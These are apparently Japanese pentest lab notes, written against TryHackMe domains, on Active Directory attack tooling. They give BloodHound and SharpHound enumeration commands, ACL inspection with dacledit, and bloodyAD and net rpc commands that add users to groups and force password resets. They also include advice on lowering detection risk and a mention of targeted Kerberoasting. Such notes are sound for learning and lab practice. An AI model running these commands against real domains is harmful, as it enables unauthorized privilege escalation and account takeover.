# BloodHound

https://github.com/BloodHoundAD/BloodHound

1. bloodhound-python や SharpHound で列挙し、jsonファイルを固めたzipファイルを出力
2. neo4j を起動
3. bloodhound でグラフ表示

列挙は「騒がしい」プロセスで、大量のイベントログを生成するため、初回は All、次回以降はセッションのみといった運用が必要。セッションは頻繁に列挙しなおす必要がある。

１．列挙を実行

```sh
bloodhound-python -u asrepuser1 -p qwerty123! -d tryhackme.loc -ns $TARGET -c All --zip
```

２．neo4j を起動

```sh
sudo neo4j start
```

３．Bloodhound を起動  

```sh
bloodhound --no-sandbox
```

GUI に zip ファイルを D&D したらインポートされる。

## グラフの注意点

グラフ上、GenericWrite があるように見えても実際には大した権限が無い場合も多い。  
エッジ詳細を見て、継承している場合はbloodhoundの推論が間違っていることがよくある。

```
Is ACL: TRUE
Is Inherited: TRUE
```

また継承していなくても、ACLの詳細を確認して WriteProperties が付いている場合、パスワード変更はできないがSPNの追加はできる可能性が高い。（標的型Kerberoasting攻撃によってそのユーザーのハッシュを入手できる）

```sh
$ dacledit.py thm.local/foo-user:'password' \
-target "Domain Guests" \
-action read \
-dc-ip $TARGET

...
[*]   ACE[7] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadControl, WriteProperties, ReadProperties, Self, ListChildObjects (0x2003c)
[*]     Trustee (SID)             : ZACHARY_HUNT (S-1-5-21-1966530601-3185510712-10604624-1423)
...
```

## SharpHound（Windows）

```ps
# 全部列挙
# アウトプットとして zipファイルが作成される
SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs

# セッションだけ
SharpHound.exe --CollectionMethods Session --Domain za.tryhackme.com --ExcludeDCs
```

```shell
# kali に zip をコピー
scp <AD Username>@THMJMP1.za.tryhackme.com:C:/Users/<AD Username>/Documents/<Sharphound ZIP> .
```

--ExcludeDCs は DC を除外し、検出リスクを下げる。

```sh
.\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs
```

## bloodyAD

```sh
pip install bloodyAD
```

### ユーザーをグループに追加

```sh
bloodyAD -u 'user' -p 'password' -d 'thm.local' --host $TARGET add groupMember 'DOMAIN GUESTS' 'add-user'
```

### パスワード変更

```sh
bloodyAD -u 'user' -p 'password' -d 'thm.local' --host $TARGET set password 'mod-user' 'P@ssw0rd123!'
```

参考

```sh
net rpc password "mod-user" "newP@ssword2022" -U 'user'%'password' -I $TARGET -S "thm.local"
```
